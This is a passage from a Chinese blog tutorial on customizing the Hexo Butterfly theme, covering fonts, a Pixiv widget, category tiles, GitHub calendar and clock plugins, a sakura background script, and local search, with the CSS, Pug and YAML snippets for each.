class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&#x27;https://cdn.jsdelivr.net/gh/tzy13755126023/BLOG_SOURCE/font/ZhuZiAWan.woff2&#x27;</span>);</span><br><span class="line">    <span class="comment">/* 字体文件路径 */</span></span><br><span class="line">    <span class="attribute">font-display</span>: swap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span>,</span><br><span class="line"><span class="selector-class">.gitcalendar</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: tzy <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Card卡片图片填充"><a href="#Card卡片图片填充" class="headerlink" title="Card卡片图片填充"></a>Card卡片图片填充</h1><p>文章展示图片会因为图片大小不合适而显示缺失，我们可以通过外挂css来覆盖原来的配置，只需在<code>mycss.css</code>中加入</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* card卡片图片填充 */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span> <span class="selector-class">.post_cover</span> <span class="selector-tag">img</span><span class="selector-class">.post_bg</span> &#123;</span><br><span class="line">    <span class="attribute">object-fit</span>: fill <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="添加Pixiv日榜"><a href="#添加Pixiv日榜" class="headerlink" title="添加Pixiv日榜"></a>添加Pixiv日榜</h1><h2 id="效果展示：-2"><a href="#效果展示：-2" class="headerlink" title="效果展示："></a>效果展示：</h2><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112121524434.png" alt="image-20211212145009943"></p><h2 id="配置方法：-2"><a href="#配置方法：-2" class="headerlink" title="配置方法："></a>配置方法：</h2><p>在<code>themes\butterfly\layout\includes\widget</code>文件夹新建 <code>card_pixiv.pug</code>文件，文件内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.card-widget.card-pixiv</span><br><span class="line"> .card-content</span><br><span class="line">  .item-headline</span><br><span class="line">    i.fa.fa-image(aria-hidden=&quot;true&quot;)</span><br><span class="line">    span= _p(&#x27;aside.card_pixiv&#x27;)</span><br><span class="line">    iframe(src=&quot;https://cloud.mokeyjay.com/pixiv&quot; frameborder=&quot;0&quot;  style=&quot;width:99%;height:380px;margin:0;&quot;)</span><br></pre></td></tr></table></figure><p>编辑<code>themes\butterfly\layout\includes\widget\index.pug </code>文件，在你想要显示的位置插入以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if theme.aside.card_pixiv</span><br><span class="line">    !=partial(&#x27;includes/widget/card_pixiv&#x27;, &#123;&#125;, &#123;cache:true&#125;)</span><br></pre></td></tr></table></figure><p>编辑<code> _config.butterfly.yml</code> 文件，在 <code>card_webinfo</code> 下面添加一行 `card_pixiv: true</p><p>编辑 <code>themes\Butterfly\languages\zh-CN.yml</code>文件 (请根据你的网站语言选择)，找到 <code>card_announcement: 公告</code> , 在下面添加一行 <code>card_pixiv: Pixiv日榜Top50</code>(后面的文本可自定义)</p><h1 id="分类磁铁"><a href="#分类磁铁" class="headerlink" title="分类磁铁"></a>分类磁铁</h1><h2 id="效果展示：-3"><a href="#效果展示：-3" class="headerlink" title="效果展示："></a>效果展示：</h2><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112082121467.png" alt="image-20211208204541047"></p><h2 id="配置方法：-3"><a href="#配置方法：-3" class="headerlink" title="配置方法："></a>配置方法：</h2><p>在<code>HexoBlog\themes\butterfly\source\css\_layout</code>目录下新建<code>categoryBar.styl</code>，写入以下内容</p><figure class="highlight styl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> hexo-config(<span class="string">&#x27;categoryBar.enable&#x27;</span>)</span><br><span class="line">  <span class="selector-id">#categoryBar</span></span><br><span class="line">    <span class="attribute">width</span> <span class="number">100%</span><span class="meta">!important</span></span><br><span class="line">  <span class="selector-tag">ul</span></span><br><span class="line">    &amp;<span class="selector-class">.categoryBar-list</span></span><br><span class="line">      <span class="attribute">margin</span> <span class="number">5px</span> <span class="number">5px</span> <span class="number">0</span> <span class="number">5px</span><span class="meta">!important</span></span><br><span class="line">      <span class="attribute">padding</span> <span class="number">0</span><span class="meta">!important</span></span><br><span class="line"></span><br><span class="line">  <span class="selector-tag">li</span></span><br><span class="line">    &amp;<span class="selector-class">.categoryBar-list-item</span></span><br><span class="line">      <span class="attribute">font-weight</span> bold</span><br><span class="line">      <span class="attribute">display</span> inline-block</span><br><span class="line">      <span class="attribute">height</span> <span class="number">180px</span><span class="meta">!important</span></span><br><span class="line">      <span class="attribute">margin</span> <span class="number">5px</span> .<span class="number">5%</span> <span class="number">0</span> .<span class="number">5%</span><span class="meta">!important</span></span><br><span class="line">      <span class="attribute">background-image</span> linear-gradient(rgba(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.4</span>) <span class="number">25%</span>, rgba(<span class="number">16</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">0</span>) <span class="number">100%</span>)</span><br><span class="line">      <span class="attribute">border-radius</span> <span class="number">10px</span></span><br><span class="line">      <span class="attribute">padding</span> <span class="number">25px</span> <span class="number">0</span> <span class="number">25px</span> <span class="number">25px</span><span class="meta">!important</span></span><br><span class="line">      <span class="attribute">box-shadow</span> rgba(<span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">0.3</span>)  <span class="number">50px</span> <span class="number">50px</span> <span class="number">50px</span> <span class="number">50px</span> inset</span><br><span class="line">      <span class="attribute">overflow</span> hidden</span><br><span class="line">      <span class="attribute">background-size</span> <span class="number">100%</span><span class="meta">!important</span></span><br><span class="line">      <span class="attribute">background-position</span> center<span class="meta">!important</span></span><br><span class="line">      <span class="selector-pseudo">&amp;:hover</span></span><br><span class="line">        <span class="attribute">background-size</span> <span class="number">110%</span><span class="meta">!important</span></span><br><span class="line">        <span class="attribute">box-shadow</span> inset <span class="number">500px</span> <span class="number">50px</span> <span class="number">50px</span> <span class="number">50px</span> rgba(<span class="number">50</span>,<span class="number">50</span>,<span class="number">50</span>, <span class="number">0.6</span>)</span><br><span class="line">        <span class="selector-tag">span</span></span><br><span class="line">          &amp;<span class="selector-class">.categoryBar-list-count</span></span><br><span class="line">            <span class="selector-pseudo">&amp;::after</span></span><br><span class="line">              <span class="attribute">transition</span> all .<span class="number">5s</span></span><br><span class="line">              <span class="attribute">transform</span> translate(-<span class="number">100%</span>, <span class="number">0</span>)</span><br><span class="line">  <span class="selector-tag">a</span></span><br><span class="line">    &amp;<span class="selector-class">.categoryBar-list-link</span></span><br><span class="line">      <span class="attribute">color</span> white<span class="meta">!important</span></span><br><span class="line">      <span class="attribute">font-size</span> <span class="number">20px</span><span class="meta">!important</span></span><br><span class="line">      <span class="selector-pseudo">&amp;::before</span></span><br><span class="line">        <span class="attribute">content</span> <span class="string">&#x27;|&#x27;</span><span class="meta">!important</span></span><br><span class="line">        <span class="attribute">color</span> white<span class="meta">!important</span></span><br><span class="line">        <span class="attribute">font-size</span> <span class="number">20px</span><span class="meta">!important</span></span><br><span class="line">      &amp;:after</span><br><span class="line">        <span class="attribute">content</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="attribute">position</span> relative</span><br><span class="line">        <span class="attribute">width</span> <span class="number">0</span></span><br><span class="line">        <span class="attribute">bottom</span> <span class="number">0</span></span><br><span class="line">        <span class="attribute">display</span> block</span><br><span class="line">        <span class="attribute">height</span> <span class="number">3px</span></span><br><span class="line">        <span class="attribute">border-radius</span> <span class="number">3px</span></span><br><span class="line">        <span class="attribute">background-color</span> white</span><br><span class="line">      <span class="selector-pseudo">&amp;:hover</span></span><br><span class="line">        &amp;:after</span><br><span class="line">          <span class="attribute">width</span> <span class="number">90%</span></span><br><span class="line">          <span class="attribute">left</span> <span class="number">1%</span></span><br><span class="line">          <span class="attribute">transition</span> all <span class="number">0.5s</span></span><br><span class="line"></span><br><span class="line">  <span class="selector-tag">span</span></span><br><span class="line">    &amp;<span class="selector-class">.categoryBar-list-count</span></span><br><span class="line">      <span class="attribute">display</span> block<span class="meta">!important</span></span><br><span class="line">      <span class="attribute">color</span> white<span class="meta">!important</span></span><br><span class="line">      <span class="attribute">font-size</span> <span class="number">20px</span><span class="meta">!important</span></span><br><span class="line">      <span class="selector-pseudo">&amp;::before</span></span><br><span class="line">        <span class="attribute">content</span> <span class="string">&#x27;\f02d&#x27;</span><span class="meta">!important</span></span><br><span class="line">        <span class="attribute">padding-right</span> <span class="number">15px</span><span class="meta">!important</span></span><br><span class="line">        <span class="keyword">@extend</span> <span class="selector-class">.fontawesomeIcon</span></span><br><span class="line">      <span class="selector-pseudo">&amp;::after</span></span><br><span class="line">        <span class="attribute">padding</span> <span class="number">5px</span></span><br><span class="line">        <span class="attribute">display</span> block<span class="meta">!important</span></span><br><span class="line">        <span class="attribute">color</span> white<span class="meta">!important</span></span><br><span class="line">        <span class="attribute">font-size</span> <span class="number">20px</span><span class="meta">!important</span></span><br><span class="line">        <span class="attribute">position</span> relative</span><br><span class="line">        <span class="attribute">right</span> -<span class="number">100%</span></span><br><span class="line">  covers = hexo-config(<span class="string">&#x27;categoryBar.cover&#x27;</span>)</span><br><span class="line">  <span class="keyword">for</span> cover,<span class="selector-tag">i</span> <span class="keyword">in</span> covers</span><br><span class="line">    <span class="selector-tag">li</span><span class="selector-class">.categoryBar-list-item</span><span class="selector-pseudo">:nth-child</span>(&#123;i+<span class="number">1</span>&#125;)</span><br><span class="line">      <span class="attribute">background</span> unquote(cover)</span><br><span class="line">  descrs = hexo-config(<span class="string">&#x27;categoryBar.descr&#x27;</span>)</span><br><span class="line">  <span class="keyword">for</span> descr,<span class="selector-tag">i</span> <span class="keyword">in</span> descrs</span><br><span class="line">    <span class="selector-tag">li</span><span class="selector-class">.categoryBar-list-item</span><span class="selector-pseudo">:nth-child</span>(&#123;i+<span class="number">1</span>&#125;)&gt;<span class="selector-tag">span</span><span class="selector-pseudo">::after</span></span><br><span class="line">      <span class="attribute">content</span> descr<span class="meta">!important</span></span><br><span class="line">  <span class="keyword">if</span> hexo-config(<span class="string">&#x27;categoryBar.column&#x27;</span>) == <span class="string">&#x27;odd&#x27;</span></span><br><span class="line">    <span class="selector-tag">li</span></span><br><span class="line">      &amp;<span class="selector-class">.categoryBar-list-item</span></span><br><span class="line">        <span class="attribute">width</span> <span class="number">32.3%</span><span class="meta">!important</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> hexo-config(<span class="string">&#x27;categoryBar.column&#x27;</span>) == <span class="string">&#x27;even&#x27;</span></span><br><span class="line">    <span class="selector-tag">li</span></span><br><span class="line">      &amp;<span class="selector-class">.categoryBar-list-item</span></span><br><span class="line">        <span class="attribute">width</span> <span class="number">24%</span><span class="meta">!important</span></span><br><span class="line">  <span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">650px</span>)</span><br><span class="line">    li</span><br><span class="line">      &amp;.categoryBar-list-item</span><br><span class="line">        <span class="attribute">width</span> <span class="number">48%</span>!important</span><br><span class="line">        <span class="attribute">height</span> <span class="number">150px</span>!important</span><br><span class="line">        margin <span class="number">5px</span> <span class="number">1%</span> <span class="number">0</span> <span class="number">1%</span>!important</span><br><span class="line"></span><br><span class="line">  $caterow =  hexo-config(&#x27;categoryBar.row&#x27;)?hexo-config(&#x27;categoryBar.row&#x27;):<span class="number">2</span></span><br><span class="line">  .categoryBar-list</span><br><span class="line">    <span class="attribute">max-height</span> <span class="number">190px</span> * $caterow</span><br><span class="line">    overflow auto</span><br><span class="line">    &amp;::-webkit-scrollbar</span><br><span class="line">      <span class="attribute">width</span> <span class="number">0</span>!important</span><br><span class="line">  @media screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">650px</span>)</span><br><span class="line">    .categoryBar-list</span><br><span class="line">      <span class="attribute">max-height</span> <span class="number">160px</span> * $caterow</span><br></pre></td></tr></table></figure><p>将<code>HexoBlog\themes\butterfly\layout\index.pug</code>修改为如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">extends includes/layout.pug</span><br><span class="line"></span><br><span class="line">block content</span><br><span class="line">  include ./includes/mixins/post-ui.pug</span><br><span class="line">  #recent-posts.recent-posts</span><br><span class="line">    if theme.categoryBar.enable</span><br><span class="line">      .recent-post-item(style=&#x27;height:auto;width:100%;padding:0px;&#x27;)</span><br><span class="line">        #categoryBar!= list_categories(site.categories,&#123;class: &#x27;categoryBar&#x27;,depth: 1&#125;)</span><br><span class="line">    +postUI</span><br><span class="line">    include includes/pagination.pug</span><br></pre></td></tr></table></figure><p>==一定要注意缩进==</p><p>在<code>_config.butterfly.yml</code>加入：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">categoryBar:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">column:</span> <span class="string">odd</span> <span class="comment"># 显示列数,odd：3列 | even：4列</span></span><br><span class="line">  <span class="attr">row:</span> <span class="number">2</span> <span class="comment">#显示行数，默认两行，超过行数切换为滚动显示</span></span><br><span class="line">  <span class="attr">descr:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Every</span> <span class="string">day</span> <span class="string">the</span> <span class="string">CTF</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Good</span> <span class="string">things</span> <span class="string">to</span> <span class="string">share</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Race</span> <span class="string">rush</span> <span class="string">!</span> <span class="string">!</span> <span class="string">!</span></span><br><span class="line">  <span class="attr">cover:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">url(&#x27;https://xxx.xxx.xxx/xxx.jpg&#x27;)</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数名</th><th align="left">可选参数</th><th align="left">参数释义</th></tr></thead><tbody><tr><td align="left">enable</td><td align="left"><code>true</code>、<code>false</code></td><td align="left">必填项。控制磁贴开关，<code>true</code> 为开启，<code>false</code> 为关闭</td></tr><tr><td align="left">colume</td><td align="left"><code>odd</code>、<code>even</code></td><td align="left">必填项。控制磁贴显示列数，<code>odd</code> 为 3 列，<code>even</code> 为 4 列</td></tr><tr><td align="left">raw</td><td align="left"><code>1</code>、<code>2</code>、<code>3</code>…(大于 0 的整数即可)</td><td align="left">选填项，默认显示两行。控制磁贴显示行数，超过自动切换为滚动显示。</td></tr><tr><td align="left">descr</td><td align="left"><code>string</code> 格式，任意字符串均可</td><td align="left">选填项，默认为空。磁贴描述，根据磁贴从左到右，从上到下的顺序配置。每行用 <code>-</code> 开头，如果要跳着填写，前一行需要留空。</td></tr><tr><td align="left">cover</td><td align="left">- <code>url(&#39;/img/cover.png&#39;)</code> - <code>&#39;#abcdef&#39;</code> - <code>rgba(45,67,89,0.7)</code> - <code>linear-gradient(rgba(0, 0, 0, 0.4) 25%, rgba(200,16 , 16, 0) 100%)</code></td><td align="left">选填项，默认深蓝色渐变背景。磁贴封面，根据磁贴从左到右，从上到下的顺序配置。可以配置纯色、渐变色、图片，如果要跳着填写，前一行需要留空。</td></tr></tbody></table><h1 id="GitHub贡献值"><a href="#GitHub贡献值" class="headerlink" title="GitHub贡献值"></a>GitHub贡献值</h1><h2 id="效果展示：-4"><a href="#效果展示：-4" class="headerlink" title="效果展示："></a>效果展示：</h2><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112082121468.png" alt="image-20211208205953282"></p><h2 id="配置方法：-4"><a href="#配置方法：-4" class="headerlink" title="配置方法："></a>配置方法：</h2><p>先安装插件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-githubcalendar --save</span><br></pre></td></tr></table></figure><p>然后打开Hexo的配置文件即<code>_config</code>，注：不是主题的配置文件</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">githubcalendar:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">enable_page:</span> <span class="string">/</span> <span class="comment"># 表示只在根目录(首页)显示</span></span><br><span class="line">  <span class="attr">user:</span> <span class="string">seizer-zyx</span> <span class="comment"># 替换成你 GitHub 的用户名</span></span><br><span class="line">  <span class="attr">layout_id:</span> <span class="string">recent-posts</span></span><br><span class="line">  <span class="attr">githubcalendar_html:</span> <span class="string">&#x27;&lt;div class=&quot;recent-post-item&quot; style=&quot;width:100%;height:auto;padding:10px;&quot;&gt;&lt;div id=&quot;github_loading&quot; style=&quot;width:10%;height:100%;margin:0 auto;display: block&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;  viewBox=&quot;0 0 50 50&quot; style=&quot;enable-background:new 0 0 50 50&quot; xml:space=&quot;preserve&quot;&gt;&lt;path fill=&quot;#d0d0d0&quot; d=&quot;M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z&quot; transform=&quot;rotate(275.098 25 25)&quot;&gt;&lt;animateTransform attributeType=&quot;xml&quot; attributeName=&quot;transform&quot; type=&quot;rotate&quot; from=&quot;0 25 25&quot; to=&quot;360 25 25&quot; dur=&quot;0.6s&quot; repeatCount=&quot;indefinite&quot;&gt;&lt;/animateTransform&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/div&gt;&lt;div id=&quot;github_container&quot;&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line">  <span class="attr">pc_minheight:</span> <span class="string">280px</span></span><br><span class="line">  <span class="attr">mobile_minheight:</span> <span class="string">0px</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">&quot;[&#x27;#ebedf0&#x27;, &#x27;#fdcdec&#x27;, &#x27;#fc9bd9&#x27;, &#x27;#fa6ac5&#x27;, &#x27;#f838b2&#x27;, &#x27;#f5089f&#x27;, &#x27;#c4067e&#x27;, &#x27;#92055e&#x27;, &#x27;#540336&#x27;, &#x27;#48022f&#x27;, &#x27;#30021f&#x27;]&quot;</span></span><br><span class="line">  <span class="comment"># api: https://python-github-calendar-api.vercel.app/api</span></span><br><span class="line">  <span class="attr">api:</span> <span class="string">https://python-gitee-calendar-api.vercel.app/api</span></span><br><span class="line">  <span class="attr">calendar_js:</span> <span class="string">https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.16/hexo_githubcalendar.js</span></span><br><span class="line">  <span class="comment"># color: &quot;[&#x27;#e4dfd7&#x27;, &#x27;#f9f4dc&#x27;, &#x27;#f7e8aa&#x27;, &#x27;#f7e8aa&#x27;, &#x27;#f8df72&#x27;, &#x27;#fcd217&#x27;, &#x27;#fcc515&#x27;, &#x27;#f28e16&#x27;, &#x27;#fb8b05&#x27;, &#x27;#d85916&#x27;, &#x27;#f43e06&#x27;]&quot; #橘黄色调</span></span><br><span class="line">  <span class="comment"># color: &quot;[&#x27;#ebedf0&#x27;, &#x27;#f0fff4&#x27;, &#x27;#dcffe4&#x27;, &#x27;#bef5cb&#x27;, &#x27;#85e89d&#x27;, &#x27;#34d058&#x27;, &#x27;#28a745&#x27;, &#x27;#22863a&#x27;, &#x27;#176f2c&#x27;, &#x27;#165c26&#x27;, &#x27;#144620&#x27;]&quot; #翠绿色调</span></span><br><span class="line">  <span class="comment"># color: &quot;[&#x27;#ebedf0&#x27;, &#x27;#f1f8ff&#x27;, &#x27;#dbedff&#x27;, &#x27;#c8e1ff&#x27;, &#x27;#79b8ff&#x27;, &#x27;#2188ff&#x27;, &#x27;#0366d6&#x27;, &#x27;#005cc5&#x27;, &#x27;#044289&#x27;, &#x27;#032f62&#x27;, &#x27;#05264c&#x27;]&quot; #天青色调</span></span><br></pre></td></tr></table></figure><h1 id="侧边栏电子时钟"><a href="#侧边栏电子时钟" class="headerlink" title="侧边栏电子时钟"></a>侧边栏电子时钟</h1><h2 id="效果展示：-5"><a href="#效果展示：-5" class="headerlink" title="效果展示："></a>效果展示：</h2><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112082121469.png" alt="image-20211208210323225"></p><h2 id="配置方法：-5"><a href="#配置方法：-5" class="headerlink" title="配置方法："></a>配置方法：</h2><p>先安装插件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-electric-clock --save</span><br></pre></td></tr></table></figure><p>然后打开Hexo的配置文件即<code>_config</code>，和上面相同，加入如下代码：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">electric_clock:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># 开关</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">5</span> <span class="comment">#过滤器优先权</span></span><br><span class="line">  <span class="attr">enable_page:</span> <span class="string">all</span> <span class="comment"># 应用页面</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="comment"># - /posts/</span></span><br><span class="line">    <span class="comment"># - /about/</span></span><br><span class="line">  <span class="attr">layout:</span> <span class="comment"># 挂载容器类型</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">class</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">sticky_layout</span></span><br><span class="line">    <span class="attr">index:</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">loading:</span> <span class="string">https://cdn.jsdelivr.net/gh/tzy13755126023/BLOG_SOURCE/theme_f/loading.gif</span> <span class="comment">#加载动画自定义</span></span><br></pre></td></tr></table></figure><h1 id="樱花飘落背景"><a href="#樱花飘落背景" class="headerlink" title="樱花飘落背景"></a>樱花飘落背景</h1><p>下载<code>js</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://yremp.live/wp-content/uploads/resource/js/sakura.js</span><br></pre></td></tr></table></figure><p>将该文件放在<code>themes/butterfly/source/js/sakura.js</code></p><p>接下来在<code>themes/butterfly/layout/includes/head.pug</code>文件最后引入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if theme.sakura.enable</span><br><span class="line">  script(src=&quot;/js/sakura.js&quot;)</span><br></pre></td></tr></table></figure><p>最后在主题的配置文件<code>_config.butterfly.yml</code>加入</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 页面樱花飘落动效</span></span><br><span class="line"><span class="attr">sakura:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h1 id="Hexo站点加载动画修改（巫师、钢铁侠核心、稻草人、自定义效果）"><a href="#Hexo站点加载动画修改（巫师、钢铁侠核心、稻草人、自定义效果）" class="headerlink" title="Hexo站点加载动画修改（巫师、钢铁侠核心、稻草人、自定义效果）"></a>Hexo站点加载动画修改（巫师、钢铁侠核心、稻草人、自定义效果）</h1><p>效果见本站。</p><p>需要改动大量主题源码，谨慎修改。</p><blockquote><p>参考文章：《Loading Animation》（<a href="https://akilar.top/posts/3d221bf2/">https://akilar.top/posts/3d221bf2/</a> ）</p></blockquote><h1 id="添加搜索功能"><a href="#添加搜索功能" class="headerlink" title="添加搜索功能"></a>添加搜索功能</h1><h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112121528834.png" alt="image-20211212152520994"></p><h2 id="配置方法"><a href="#配置方法" class="headerlink" title="配置方法"></a>配置方法</h2><p>先下载插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><p>然后在<code>_config.yml</code>最后添加</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">content:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>详细属性可以查看官方<a href="https://github.com/wzpan/hexo-generator-search">https://github.com/wzpan/hexo-generator-search</a></p><p>最后将<code>_config.butterfly.yml</code>的<code>local_seach</code>修改为</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">input_placeholder:</span> <span class="string">Search</span> <span class="string">for</span> <span class="string">Posts</span></span><br><span class="line">    <span class="attr">hits_empty:</span> <span class="string">&quot;We didn&#x27;t find any results for the search: $&#123;query&#125;&quot;</span> <span class="comment"># if there are no result</span></span><br></pre></td></tr></table></figure><h1 id="首页文章双栏"><a href="#首页文章双栏" class="headerlink" title="首页文章双栏"></a>首页文章双栏</h1><h2 id="效果展示：-6"><a href="#效果展示：-6" class="headerlink" title="效果展示："></a>效果展示：</h2><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112131227444.png" alt="image-20211212203011593"></p><h2 id="配置方法：-6"><a href="#配置方法：-6" class="headerlink" title="配置方法："></a>配置方法：</h2><p>首先下载插件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-butterfly-article-double-row 